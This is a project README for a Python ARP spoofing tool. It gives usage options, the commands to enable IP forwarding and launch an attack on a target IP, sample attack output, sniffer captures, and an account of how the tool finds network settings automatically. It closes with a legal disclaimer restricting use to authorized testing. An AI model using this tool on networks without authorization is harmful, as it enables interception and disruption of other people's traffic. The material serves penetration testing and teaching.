# Python 3 ARP Spoofing Tool

[![Python Version](https://img.shields.io/badge/python-3.x-blue?style=for-the-badge&logo=python)](https://github.com/EONRaider/Packet-Sniffer/)
[![Open Source? Yes!](https://img.shields.io/badge/Open%20Source%3F-Yes!-green?style=for-the-badge&logo=appveyor)](https://github.com/EONRaider/Packet-Sniffer/)
[![License](https://img.shields.io/github/license/EONRaider/Packet-Sniffer?style=for-the-badge)](https://github.com/EONRaider/Packet-Sniffer/blob/master/LICENSE)

[![Reddit](https://img.shields.io/reddit/user-karma/combined/eonraider?style=flat-square&logo=reddit)](https://www.reddit.com/user/eonraider)
[![GitHub](https://img.shields.io/github/followers/eonraider?label=GitHub&logo=github&style=flat-square)](https://github.com/EONRaider)
[![Twitter](https://img.shields.io/twitter/follow/eon_raider?style=flat-square&logo=twitter)](https://twitter.com/intent/follow?screen_name=eon_raider)

A pure-Python ARP Cache Poisoning (a.k.a. "ARP Spoofing") tool that leverages a low-level 
assembly of Ethernet II frames and ARP packets.

This application maintains no dependencies on third-party modules and can be 
run by any Python 3.x interpreter.

## Installation

Simply clone this repository with `git clone` and execute the `arpspoof.py` file 
as described in the following **Usage** section.

```sh
user@host:~/DIR$ git clone https://github.com/EONRaider/Arp-Spoofer.git
```

## Usage
```
arpspoof.py [-h] [-i INTERFACE] [--attackermac MAC] [--gatemac MAC]
                   [--targetmac MAC] [--gateip IP] [--interval TIME]
                   [--disassociate]
                   IP

Execute ARP Cache Poisoning attacks (a.k.a "ARP Spoofing") on local networks.

positional arguments:
  TARGET_IP                    IP address currently assigned to the target.

optional arguments:
  -h, --help            show this help message and exit
  -i INTERFACE, --interface INTERFACE
                        Interface on the attacker machine to send packets
                        from.
  --attackermac MAC     MAC address of the NIC from which the attacker machine
                        will send the spoofed ARP packets.
  --gatemac MAC         MAC address of the NIC associated to the gateway.
  --targetmac MAC       MAC address of the NIC associated to the target.
  --gateip IP           IP address currently assigned to the gateway.
  --interval TIME       Time in between each transmission of spoofed ARP
                        packets (defaults to 0.5 seconds).
  --disassociate        Execute a disassociation attack in which a randomized
                        MAC address is set for the attacker machine,
                        effectively making the target host send packets to a
                        non-existent gateway.
```


## Running the Application

- Execute the following command with administrative privileges in order to enable 
forwarding of IPv4 packets through the attacker machine. This is a temporary solution 
meant to be reset upon the next reboot (for a permanent solution check [this guide](https://linuxhint.com/enable_ip_forwarding_ipv4_debian_linux/)):

```sh
user@host:~$ sudo sysctl -w net.ipv4.ip_forward=1
```

- Example command in which we initiate an attack against a given target machine 
and gateway (the `eth0` interface is the one the attacker uses to send spoofed 
packets in this example):

```sh
user@host:~$ sudo python3 arpspoof.py 10.0.1.6
  
[>>>] ARP Spoofing configuration:
    [+] Interface    .....................eth0
    [+] Attacker MAC ........08:92:27:dc:3a:71
    [+] Gateway IP   .................10.0.1.1
    [+] Gateway MAC  ........52:93:d0:92:c5:06
    [+] Target IP    .................10.0.1.6
    [+] Target MAC   ........91:8b:28:93:af:07

[!] ARP packets ready. Execute the attack with these settings? (Y/N) y

[+] ARP Spoofing attack initiated. Press Ctrl-C to abort.
```

- Traffic displayed by [Network Packet Sniffer](https://github.com/EONRaider/Packet-Sniffer)
as the attack initiated above takes place:

```sh
[>] Packet #1 at 14:10:12:
    [+] MAC ......08:92:27:dc:3a:71 -> ff:ff:ff:ff:ff:ff
    [+] ARP Who has      10.0.1.6 ? -> Tell 10.0.1.5
[>] Packet #2 at 14:10:12:
    [+] MAC ......91:8b:28:93:af:07 -> 08:92:27:dc:3a:71
    [+] ARP ...............10.0.1.6 -> Is at 91:8b:28:93:af:07
[>] Packet #3 at 14:10:12:
    [+] MAC ......08:92:27:dc:3a:71 -> 91:8b:28:93:af:07
    [+] IPv4 ..............10.0.1.5 -> 10.0.1.6        | PROTO: UDP TTL: 64
    [+] UDP ..................52949 -> 54663
[>] Packet #4 at 14:10:12:
    [+] MAC ......91:8b:28:93:af:07 -> 08:92:27:dc:3a:71
    [+] IPv4 ..............10.0.1.6 -> 10.0.1.5        | PROTO: ICMP TTL: 64
    [+] ICMP ..............10.0.1.6 -> 10.0.1.5        | Type: OTHER
[>] Packet #5 at 14:10:18:
    [+] MAC ......08:92:27:dc:3a:71 -> 52:54:00:12:35:00
    [+] ARP ...............10.0.1.6 -> Is at 08:92:27:dc:3a:71
[>] Packet #6 at 14:10:18:
    [+] MAC ......08:92:27:dc:3a:71 -> 91:8b:28:93:af:07
    [+] ARP ...............10.0.1.1 -> Is at 08:92:27:dc:3a:71
```

### How it works

From the docstring of the `ARPSetupProxy` class in the 
[packets.py](https://github.com/EONRaider/Arp-Spoofer/blob/master/packets.py)
file:
> Performs a best-effort attempt to query the system and network for
information necessary to build the ARP attack packets. **It allows the
user to initiate an attack by simply supplying the target's IP
address**. All other required settings are looked up from the
attacker system's ARP and routing tables and by probing ephemeral
ports on the target host.

- Operations executed to obtain each configuration:
    - `Interface`: Parse routing table and look for interfaces connected 
    to the gateway.
    - `Attacker MAC`: Bind to interface and query name from `socket`.
    - `Gateway IP`: Parse routing table and find route with `0x0003` 
    flag set.
    - `Gateway MAC`: Parse ARP table looking for devices with `Gateway IP`.
    - `Target MAC`: Send a UDP datagram with a null-byte to a random 
    ephemeral port on the target system, effectively making the attacker
    system execute an ARP request to the broadcast address, and then
    reading the newly written information from the ARP table.
 
These are the reasons why a simple command such as 
`sudo python3 arpspoof.py 10.0.1.6` from the instructions above is able to 
initiate a gathering of all required information to initiate the attack,
releasing the Penetration Tester from going through all the usual commands
necessary to obtain them.

## Legal Disclaimer
The use of code contained in this repository, either in part or in its totality, 
for engaging targets without prior mutual consent is illegal. **It is 
the end-user's responsibility to obey all applicable local, state 
and federal laws.**

Developers assume **no liability** and are not 
responsible for misuses or damages caused by any code contained 
in this repository in any event that, accidentally or otherwise, it comes to 
be utilized by a threat agent or unauthorized entity as a means to compromise the security, privacy, 
confidentiality, integrity and/or availability of systems and their associated 
 resources by leveraging the exploitation of known or unknown vulnerabilities present 
in said systems, including, but not limited to, the implementation of security controls, 
human- or electronically-enabled.

The use of this code is **only** endorsed by the developers in those circumstances 
directly related to **educational environments** or **authorized penetration testing 
engagements** whose declared purpose is that of finding and mitigating vulnerabilities 
in systems, limiting their exposure to compromises and exploits employed by malicious 
agents as defined in their respective threat models.
